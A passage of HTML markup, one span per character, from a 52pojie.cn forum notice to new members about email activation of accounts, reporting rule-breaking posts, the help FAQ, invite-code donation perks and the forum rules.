initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">只</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">通</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">才</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">常</span><span style="display: inline-block; text-indent: initial;">访</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">载</span><span style="display: inline-block; text-indent: initial;">附</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">否</span><span style="display: inline-block; text-indent: initial;">则</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">掉</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">何</span><span style="display: inline-block; text-indent: initial;">操</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">具</span><span style="display: inline-block; text-indent: initial;">体</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">看</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">验</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">子</span></span></strong><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">9</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p></li></ol><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">奖</span></h2><p style="margin-bottom: 0px; color: rgb(53, 53, 53);"><span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">众</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">热</span><span style="display: inline-block; text-indent: initial;">心</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">员</span><span style="display: inline-block; text-indent: initial;">积</span><span style="display: inline-block; text-indent: initial;">极</span><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">违</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">行</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">协</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">团</span><span style="display: inline-block; text-indent: initial;">队</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">工</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">斑</span><span style="display: inline-block; text-indent: initial;">竹</span><span style="display: inline-block; text-indent: initial;">巡</span><span style="display: inline-block; text-indent: initial;">查</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">辛</span><span style="display: inline-block; text-indent: initial;">勤</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;">益</span><span style="display: inline-block; text-indent: initial;">恢</span><span style="display: inline-block; text-indent: initial;">复</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">常</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">但</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">灌</span><span style="display: inline-block; text-indent: initial;">水</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">冒</span><span style="display: inline-block; text-indent: initial;">充</span><span style="display: inline-block; text-indent: initial;">别</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">品</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">甚</span><span style="display: inline-block; text-indent: initial;">至</span><span style="display: inline-block; text-indent: initial;">投</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">木</span><span style="display: inline-block; text-indent: initial;">马</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">层</span><span style="display: inline-block; text-indent: initial;">出</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">穷</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">虽</span><span style="display: inline-block; text-indent: initial;">然</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">反</span><span style="display: inline-block; text-indent: initial;">病</span><span style="display: inline-block; text-indent: initial;">毒</span><span style="display: inline-block; text-indent: initial;">工</span><span style="display: inline-block; text-indent: initial;">程</span><span style="display: inline-block; text-indent: initial;">师</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">团</span><span style="display: inline-block; text-indent: initial;">队</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">但</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">力</span><span style="display: inline-block; text-indent: initial;">量</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">远</span><span style="display: inline-block; text-indent: initial;">远</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">够</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">里</span><span style="display: inline-block; text-indent: initial;">需</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">参</span><span style="display: inline-block; text-indent: initial;">与</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">秩</span><span style="display: inline-block; text-indent: initial;">序</span><span style="display: inline-block; text-indent: initial;">维</span><span style="display: inline-block; text-indent: initial;">护</span><span style="display: inline-block; text-indent: initial;">中</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">维</span><span style="display: inline-block; text-indent: initial;">护</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">秩</span><span style="display: inline-block; text-indent: initial;">序</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">责</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">尽</span><span style="display: inline-block; text-indent: initial;">自</span><span style="display: inline-block; text-indent: initial;">己</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">份</span><span style="display: inline-block; text-indent: initial;">力</span><span style="display: inline-block; text-indent: initial;">量</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">帮</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">维</span><span style="display: inline-block; text-indent: initial;">护</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">秩</span><span style="display: inline-block; text-indent: initial;">序</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">现</span><span style="display: inline-block; text-indent: initial;">违</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">子</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">投</span><span style="display: inline-block; text-indent: initial;">诉</span><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">区</span><span style="display: inline-block; text-indent: initial;">投</span><span style="display: inline-block; text-indent: initial;">诉</span><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">f</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">u</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">站</span><span style="display: inline-block; text-indent: initial;">点</span><span style="display: inline-block; text-indent: initial;">帮</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">文</span><span style="display: inline-block; text-indent: initial;">档</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><strong><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">般</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">里</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">找</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">！</span></strong><strong><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">?</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">=</span><span style="display: inline-block; text-indent: initial;">f</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">q</span></strong></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">相</span><span style="display: inline-block; text-indent: initial;">关</span><span style="display: inline-block; text-indent: initial;">说</span><span style="display: inline-block; text-indent: initial;">明</span></h2><ul class="list-paddingleft-1" style="padding-left: 0px; color: rgb(53, 53, 53);"><li><p><span style="color: rgb(255, 0, 0); font-size: 14px;"><span style="display: inline-block; text-indent: initial;">对</span><span style="display: inline-block; text-indent: initial;">于</span><span style="display: inline-block; text-indent: initial;">通</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">捐</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">获</span><span style="display: inline-block; text-indent: initial;">取</span><span style="background-color: rgb(255, 255, 0);"><span style="display: inline-block; text-indent: initial;">邀</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span></span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">说</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">赠</span><span style="display: inline-block; text-indent: initial;">送</span><span style="display: inline-block; text-indent: initial;">9</span><span style="display: inline-block; text-indent: initial;">6</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">币</span><span style="display: inline-block; text-indent: initial;">价</span><span style="display: inline-block; text-indent: initial;">值</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">元</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">而</span><span style="display: inline-block; text-indent: initial;">且</span><span style="display: inline-block; text-indent: initial;">免</span><span style="display: inline-block; text-indent: initial;">受</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">跃</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">风</span><span style="display: inline-block; text-indent: initial;">险</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">点</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">滴</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li><li><p><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">先</span><span style="display: inline-block; text-indent: initial;">自</span><span style="display: inline-block; text-indent: initial;">己</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;">【</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">总</span><span style="display: inline-block; text-indent: initial;">版</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">】</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">[</span><span style="display: inline-block; text-indent: initial;">让</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">速</span><span style="display: inline-block; text-indent: initial;">融</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">庭</span><span style="display: inline-block; text-indent: initial;">]</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">样</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">于</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">融</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">4</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">6</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p></li><li><p><span style="background-color: rgb(255, 255, 0); font-size: 14px;"><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">并</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">意</span><span style="display: inline-block; text-indent: initial;">味</span><span style="display: inline-block; text-indent: initial;">着</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">已</span><span style="display: inline-block; text-indent: initial;">经</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">仅</span><span style="display: inline-block; text-indent: initial;">仅</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">第</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">步</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">坚</span><span style="display: inline-block; text-indent: initial;">持</span><span style="display: inline-block; text-indent: initial;">登</span><span style="display: inline-block; text-indent: initial;">录</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">保</span><span style="display: inline-block; text-indent: initial;">持</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">跃</span><span style="display: inline-block; text-indent: initial;">才</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">保</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">庭</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">每</span><span style="display: inline-block; text-indent: initial;">次</span><span style="display: inline-block; text-indent: 